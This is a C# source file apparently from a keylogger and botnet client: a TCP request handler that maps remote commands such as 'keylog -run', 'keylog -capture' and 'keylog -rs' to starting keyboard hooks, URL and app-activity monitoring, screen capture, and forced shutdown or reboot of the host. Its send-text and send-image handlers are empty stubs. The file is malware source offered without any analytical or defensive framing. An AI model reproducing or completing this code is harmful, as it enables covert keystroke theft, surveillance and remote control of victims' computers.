using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace key.TCPAcceptRequest
{
    class Request
    {
        private static Request _Instance;

        public static Request Instance
        {
            get
            {
                if (_Instance == null)
                {
                    _Instance = new Request();
                }
                return _Instance;
            }
            private set
            {

            }
        }
        public Request() { }

        public void AcceptRequestServer(string request)
        {
            switch (request)
            {
                case "keylog -run":
                    {
                        try
                        {
                            KeyLogger.Run.Instance.RunThread("run all");
                        }
                        catch (Exception a)
                        {
                            a.ToString();
                        }
                    }
                    break;
                case "keylog -kill":
                    {
                        try
                        {
                            KeyLogger.Run.Instance.thread.Abort();
                            KeyLogger.Run.Instance.thread1.Abort();
                            KeyLogger.Run.Instance.thread2.Abort();
                            KeyLogger.Run.Instance.threadtime.Abort();
                        }
                        catch (Exception kill)
                        {
                            kill.ToString();
                        }
                    }
                    break;
                case "keylog -kill appActivity":
                    {
                        try
                        {
                            KeyLogger.Run.Instance.RunThread("kill appActivity");
                        }
                        catch (Exception s)
                        {
                            s.ToString();
                        }
                    }
                    break;
                case "keylog -kill CheckURL":
                    {
                        try
                        {
                            KeyLogger.Run.Instance.RunThread("kill CheckURL");
                        }
                        catch (Exception b)
                        {
                            b.ToString();
                        }
                    }
                    break;
                case "keylog -kill HookKeyboard":
                    {
                        try
                        {
                            KeyLogger.Run.Instance.RunThread("kill HookKeyboard");
                        }
                        catch (Exception c)
                        {
                            c.ToString();
                        }
                    }
                    break;
                case "keylog -capture":
                    {
                        try
                        {
                            KeyLogger.Run.Instance.StartCapture(4000);
                        }
                        catch (Exception e)
                        {
                            e.ToString();
                        }
                    }
                    break;
                case "keylog -kill capture":
                    {
                        try
                        {
                            //TargetDesktop.Instance.StartTimer(0);
                            KeyLogger.Run.Instance.threadtime.Abort();
                        }
                        catch (Exception t0)
                        {
                            t0.ToString();
                        }
                    }
                    break;
                case "keylog -sendtxt":
                    {
                        try
                        {
                            //
                        }
                        catch (Exception sendtxt)
                        {
                            sendtxt.ToString();
                        }
                    }
                    break;
                case "keylog -sendpng":
                    {
                        try
                        {
                            //
                        }
                        catch (Exception sendpng)
                        {
                            sendpng.ToString();
                        }
                    }
                    break;
                case "keylog -rd":
                    {
                        try
                        {
                            Botnet.API.DoExitWin(Botnet.ExitWindowsFlags.EWX_SHUTDOWN);
                        }
                        catch (Exception rb)
                        {
                            rb.ToString();
                        }
                    }
                    break;
                case "keylog -rs":
                    {
                        try
                        {
                            Botnet.API.DoExitWin(Botnet.ExitWindowsFlags.EWX_REBOOT); ;
                        }
                        catch (Exception rb)
                        {
                            rb.ToString();
                        }
                    }
                    break;
            }
        }
    }
}
